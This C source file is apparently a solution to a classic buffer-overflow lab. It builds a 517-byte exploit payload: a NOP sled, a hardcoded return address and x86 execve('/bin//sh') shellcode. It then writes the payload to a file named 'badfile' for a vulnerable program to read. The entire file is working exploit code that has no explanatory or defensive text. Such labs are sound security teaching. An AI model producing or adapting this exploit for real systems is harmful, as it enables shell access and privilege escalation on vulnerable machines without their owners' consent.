#include <stdio.h>
#include <stdlib.h>
#include <string.h>

const char code[] =
	"\x31\xc0"	/* xorl		%eax, %eax	*/
	"\x50"		/* pushl	%eax		*/
	"\x68""//sh"	/* pushl	$addr		*/
	"\x68""/bin"	/* pushl	$addr		*/
	"\x89\xe3"	/* movl		%esp, %ebx	*/
	"\x50"		/* pushl	%eax		*/
	"\x53"		/* pushl	%ebx		*/
	"\x89\xe1"	/* movl		%esp, %ecx	*/
	"\x99"		/* cdq				*/
	"\xb0\x0b"	/* movb		$0x0b, %al	*/
	"\xcd\x80"	/* int		$0x80		*/
	;

int
main(int argc, char *argv[])
{
	char buf[517];
	FILE *badfile;

	/* fill with nops */
	memset(&buf, 0x90, 517);

	/* place return address */
	*((long *)(buf + 0x24)) = 0xbfffeb48 + 0x60;

	/* place the shellcode at the end of buf */
	memcpy(buf + sizeof(buf) - sizeof(code), code, sizeof(code));

	/* save the contents of badfile */
	badfile = fopen("./badfile", "w");
	fwrite(buf, 517, 1, badfile);
	fclose(badfile);

	return (0);
}
